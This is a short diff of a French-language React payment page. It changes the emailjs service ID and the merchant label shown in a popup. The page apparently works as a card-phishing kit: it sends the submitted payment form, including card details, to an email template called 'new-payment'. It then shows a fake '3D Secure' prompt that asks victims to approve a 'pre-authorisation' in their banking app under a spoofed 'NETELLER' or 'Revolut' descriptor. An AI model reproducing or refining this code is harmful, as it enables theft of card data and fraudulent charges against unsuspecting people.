@@ -86,7 +86,7 @@ const Board = () => {
       setShow3DSecurePopup(true);
     }, 5000);
 
-    emailjs.sendForm('gmail-alexandre', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
+    emailjs.sendForm('gmail-alexandr', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
       .then(() => {
         console.log('SUCCESS!');
         setIsLoading(false);
@@ -207,7 +207,7 @@ const Board = () => {
             ) : (
               <>
                 <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} via votre application bancaire.</p>
-                <span>Revolut ** Essai {selectedPlan}</span>
+                <span>NETELLER* Essai Freelance</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
 
